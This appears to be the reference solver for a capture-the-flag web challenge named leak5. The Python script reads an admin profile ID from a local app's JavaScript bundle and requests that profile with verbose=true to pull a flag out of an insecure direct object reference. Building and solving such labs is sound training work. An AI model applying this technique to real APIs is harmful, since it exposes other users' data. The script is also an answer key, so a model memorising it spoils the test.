#!/usr/bin/env python3
"""Reference exploit for leak5 (formerly leak-idor-api).

Find the admin id in the JS bundle, then request that profile with
verbose=true to get the flag out of the widened response.
"""
import os
import re
import sys
import time
import requests

BASE = sys.argv[1] if len(sys.argv) > 1 else os.environ.get(
    "BASE", "http://127.0.0.1:8014")


def main() -> int:
    for _ in range(30):
        try:
            requests.get(BASE, timeout=2)
            break
        except requests.RequestException:
            time.sleep(1)
    js = requests.get(BASE + "/static/app.js", timeout=5).text
    m = re.search(r"ADMIN_PROFILE_ID\s*=\s*(\d+)", js)
    if not m:
        sys.stderr.write("no admin id in JS\n")
        return 1
    uid = int(m.group(1))
    r = requests.get(f"{BASE}/api/users/{uid}?verbose=true", timeout=5)
    mf = re.search(r"flag\{[^}]*\}", r.text)
    if mf:
        print(mf.group(0))
        return 0
    sys.stderr.write("no flag in verbose profile\n")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
